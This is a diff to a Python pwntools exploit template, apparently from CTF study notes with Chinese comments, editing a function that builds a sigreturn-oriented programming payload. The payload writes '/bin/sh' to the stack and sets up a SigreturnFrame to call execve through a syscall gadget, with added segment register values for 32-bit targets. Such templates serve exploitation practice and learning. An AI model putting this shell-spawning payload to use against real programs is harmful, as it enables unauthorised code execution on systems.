@@ -148,19 +148,18 @@ def ret2sigReturn():
     syscall_ret gadget
     sigreturnFrame
     
-    
     '''
     # 需要注意，要设置一下context.arch 和kernel，如下所示
     # 如果系统为32位，程序位32位
     context.arch='i386'
-    frame = SigreturnFrame('i386')
+    frame = SigreturnFrame(kernel='i386')
     # 如果是64位系统 64位程序
     context.arch = 'amd64'
-    frame = SigreturnFrame('amd64')
+    frame = SigreturnFrame(kernel='amd64')
     
     # 如果是64位系统下跑32位程序
     context.arch = 'i386'
-    frame = SigreturnFrame('amd64')
+    frame = SigreturnFrame(kernel='amd64')
     
     # 以下位payload
     payload = b'/bin/sh\x00' + b'a' * 0x0 # 这里注意，如果没有/bin/sh地址可以将/bin/sh写在栈上，然后泄露栈地址，计算偏移。这里覆盖到rbp。
@@ -173,6 +172,14 @@ def ret2sigReturn():
     frame.rdx = 0
     frame.rip = b'syscall' # syscall的地址
     frame.rsp = 0x00 # 如果想继续往下执行，可以把上面的rip改为syscall ; ret。然后rsp改为下一个帧的起始地址。如果不需要的话，可以设为0。
+    
+    # 注意：如果是32位程序，构造frame的时候，一定要把下面这些值加上，否则可能会crash
+    frame.cs = 35
+    frame.ss = 43
+    frame.ds = 43
+    frame.es = 43
+    frame.gs = 0
+    frame.fs = 0
     
     payload += bytes(frame)
     
